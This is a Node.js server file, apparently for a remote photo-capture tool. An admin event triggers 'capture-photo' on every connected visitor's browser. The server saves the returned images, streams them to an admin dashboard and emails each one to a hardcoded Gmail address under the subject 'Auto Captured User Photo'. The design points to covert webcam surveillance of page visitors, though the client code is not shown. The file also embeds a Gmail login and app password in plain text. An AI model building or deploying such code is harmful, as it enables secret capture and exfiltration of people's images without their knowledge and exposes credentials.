const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const nodemailer = require('nodemailer');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

// Gmail Configuration
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'Prectice@gmail.com',         // Aapka Gmail ID
        pass: 'includestdiosystem'  // Gmail ka App Password
    }
});

app.get('/admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/user.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'user.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'user.html'));
});

app.use(express.static(__dirname));
app.use('/uploads', express.static(uploadDir));

io.on('connection', (socket) => {
    console.log('⚡ Connected Device ID:', socket.id);

    socket.on('admin-trigger-capture', () => {
        io.emit('capture-photo');
    });

    socket.on('user-photo-captured', (imageData) => {
        const base64Data = imageData.replace(/^data:image\/png;base64,/, "");
        const fileName = `photo_${Date.now()}.png`;
        const filePath = path.join(uploadDir, fileName);

        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (!err) console.log(`✅ Photo Saved: uploads/${fileName}`);
        });

        // Live stream to Admin Dashboard
        io.emit('send-photo-to-admin', imageData);

        // Send Email to Prectice@gmail.com
        const mailOptions = {
            from: 'Prectice@gmail.com',
            to: 'Prectice@gmail.com',
            subject: '📸 Auto Captured User Photo',
            text: 'Live auto-captured photo attached.',
            attachments: [{ filename: fileName, content: base64Data, encoding: 'base64' }]
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) console.log('❌ Email Send Error:', error);
            else console.log('📧 Email Sent:', info.response);
        });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SERVER RUNNING on port ${PORT}!`);
});